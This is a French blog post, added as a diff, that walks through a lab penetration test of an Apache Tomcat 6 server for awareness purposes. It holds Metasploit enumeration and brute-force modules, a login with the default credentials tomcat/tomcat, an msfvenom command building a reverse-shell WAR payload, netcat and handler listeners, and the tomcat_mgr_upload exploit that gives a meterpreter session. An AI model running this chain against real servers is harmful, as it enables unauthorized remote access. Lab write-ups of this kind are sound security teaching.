@@ -1,0 +1,200 @@
+---
+layout: post
+title:  "Test d'intrusion sur un serveur apache tomcat"
+date:   2021-10-19
+last-update: 
+categories: Linux
+tags: shell ssh linux tomcat
+image: /assets/article/pentest/tomcat-metasploit/tomcat-manager.PNG 
+description: cet article présente un test d'intrusion sur un serveur apache tomcat dans l'objectif de sensibiliser le lecteur aux différentes vulnérabilités possibles pour qu'il s'en prémunisse.
+---
+
+
+
+>Ce write-up présente les possibles vulnérabilités d'un serveur Apache tomcat 6.18 afin de sensibiliser l'utilisateur à certaines bonnes pratiques lors la configuration d'un serveur apache tomcat, notamment :
+>
+>-Tenir à jour sa version tomcat
+>
+>-Utiliser des mots de passes forts
+>
+>Tous les exemples montrés sur cet article l'ont été sur des machines de laboratoires.
+>
+
+
+
+## Introduction
+
+Lors d'un laboratoire, après avoir avoir scanné le réseau avec nmap, j'ai pu voir qu'un serveur tomcat tournait sur le port 8080 à l'adresse <IP>.
+
+![tomcat-scan]({{site.url_complet}}/assets/article/pentest/tomcat-metasploit/tomcat-scan.PNG)
+
+
+
+ En accédant depuis le navigateur, j'accédais à la page d'accueil du serveur. En rouge, deux adresses url intéressantes car elles permettent d'accéder à l'interface d'administration du serveur.
+
+![tomcat-index]({{site.url_complet}}/assets/article/pentest/tomcat-metasploit/tomcat-index.PNG)
+
+## Tentative
+
+Avant de trouver la bonne solution, quelques tentatives ont été réalisées avec metasploit
+
+### tomcat_enum
+
+Ce module énumère les noms d'utilisateurs apache en envoyant des requête malformées au j_security_check.
+
+Version vulnérable : 4.1.0 - 4.1.39, 5.5.0 - 5.5.27, and 6.0.0 - 6.0.18
+
+Les nouvelles versions de Tomcat ne sont pas vulnérable
+
+```
+use auxiliary/scanner/http/tomcat_enum
+set RHOST <target IP:PORT> 
+run
+```
+
+Source : 
+
+- https://www.rapid7.com/db/modules/auxiliary/scanner/http/tomcat_enum/
+- https://book.hacktricks.xyz/pentesting/pentesting-web/tomcat#examples
+
+
+
+#### Résultat 
+
+L'attaque n'a pas fonctionnée dans mon cas
+
+### dir_scanner
+
+Le scanner de répertoire permet de scanner un serveur web afin de trouver des répertoires intéressants. 
+
+```
+use auxiliary/scanner/http/dir_scanner
+SET RHOST <target IP>
+set RPOT <traget PORT>
+run
+```
+
+Source :
+
+[www.offensive-security.com - scanner-http-auxiliary-modules/](https://www.offensive-security.com/metasploit-unleashed/scanner-http-auxiliary-modules/)
+
+#### Résultat 
+
+L'exploit n'a pas trouvé de répertoires sensibles.
+
+### Brute-force login
+
+Le module tomcat_mgr_login permet de brute-forcer la page de login du manager :
+
+Source :
+
+-  [www.rapid7.com - http/tomcat_mgr_login/](https://www.rapid7.com/db/modules/auxiliary/scanner/http/tomcat_mgr_login/)
+- [https://charlesreid1.com/wiki/Metasploitable/Apache/Tomcat_and_Coyote](https://charlesreid1.com/wiki/Metasploitable/Apache/Tomcat_and_Coyote)
+
+
+
+## Solution
+
+
+
+Sur la page http, on peut voir un lien url vers la page manager demandant un mot de passe et un nom d'utilisateur.
+
+### "Brute-force" manuel du login
+
+Sur ce github, on peut trouver tout une liste de mot de passe habituel/par défaut : [https://github.com/netbiosX/Default-Credentials/blob/master/Apache-Tomcat-Default-Passwords.mdown](https://github.com/netbiosX/Default-Credentials/blob/master/Apache-Tomcat-Default-Passwords.mdown)
+
+En cherchant également sur internet, je suis tombé sur plusieurs articles qui utilisaient la pair tomcat /tomcat comme nom d'utilisateur / mot de passe.
+
+En essayant sur la page => bingo.
+
+On arrive ainsi sur la page manager
+
+![tomcat-manager]({{site.url_complet}}/assets/article/pentest/tomcat-metasploit/tomcat-manager.PNG)
+
+
+
+### shell - Upload war
+
+Une fois sur la page de manager, on peut tenter d'obtenir un reverse shell un uploadant un fichier war.
+
+#### Tentative ratée
+
+Ayant mal configuré mon metasploit,t j'ai crû que les modules  metasploit ne fonctionnaient pas. J'obtenais l'erreur suivante : 
+
+> Handler failed to bind <ip>
+
+ J'ai donc tenté de "crafté" moi-même mon war en passant par `msfvenom`
+
+```bash
+msfvenom -p java/jsp_shell_reverse_tcp LHOST=10.10.40.122 LPORT=9998 -f war -o rshell3.war
+```
+
+Puis après avoir cliqué sur le fichier uploadé dans le manager, j'ai lancé avec metasploit et netcat des serveurs pour "écouter"
+
+- metasploit
+
+```bash
+use exploit/multi/handler
+set payload java/jsp_shell_reverse_tcp
+set LHOST 10.10.40.122
+set LPORT 9999
+exploit
+```
+
+Documentation officielle : [offensive-security.com - scanner-http-auxiliary-modules/](https://www.offensive-security.com/metasploit-unleashed/scanner-http-auxiliary-modules/)
+
+- netcat
+
+```bash
+nc -lvp 1234
+```
+
+J'ai probablement mal configuré mes attaques car celles-ci ne fonctionnaient pas
+
+
+
+#### Source 
+
+Cet article explique comment créer son propre payload avec MSFVenom
+
+https://vk9-sec.com/apache-tomcat-manager-war-reverse-shell/
+
+#### Tentative réussie
+
+J'ai retenté avec metasploit où j'ai découvert que je n'avais pas configuré mon LHOST et c'était alors mon IP habituel au lieu de celle du VPN qui était prise. C'est pour cela que j'avais l'erreur 
+
+> Handler failed to bind <ip>
+
+```bash
+use exploit/multi/http/tomcat_mgr_upload
+set RHOSTS <target IP>
+set RPORT 8080
+set LHOST <IP>
+set HttpUsername tomcat
+set HttpPassword tomcat
+exploit
+```
+
+Il suffit ensuite d'attendre quelques instants pour obtenir une session meterpreter et le tour est joué :)
+
+![tomcat-meterpreter]({{site.url_complet}}/assets/article/pentest/tomcat-metasploit/tomcat-meterpreter.png)
+
+Sur le manager, on peut constater qu'un fichier a été uploadé
+
+![manager-file-upload]({{site.url_complet}}/assets/article/pentest/tomcat-metasploit/manager-file-upload.png)
+
+
+
+Source : 
+
+[rapid7.com - http/tomcat_mgr_upload/](https://www.rapid7.com/db/modules/exploit/multi/http/tomcat_mgr_upload/)
+
+
+
+## Sources 
+
+- [https://www.certilience.fr/2019/03/tomcat-exploit-variant-host-manager/](https://www.certilience.fr/2019/03/tomcat-exploit-variant-host-manager/)
+- [https://vk9-sec.com/apache-tomcat-manager-war-reverse-shell/](https://vk9-sec.com/apache-tomcat-manager-war-reverse-shell/)
+- [https://charlesreid1.com/wiki/Metasploitable/Apache/Tomcat_and_Coyote](https://charlesreid1.com/wiki/Metasploitable/Apache/Tomcat_and_Coyote)
+- Plusieurs attaques sur tomcat : [book.hacktricks.xyz - tomcat#examples](https://book.hacktricks.xyz/pentesting/pentesting-web/tomcat#examples)
+- Documentation officielle metasploit : [rapid7.com - http/tomcat_mgr_upload/](https://www.rapid7.com/db/modules/exploit/multi/http/tomcat_mgr_upload/)
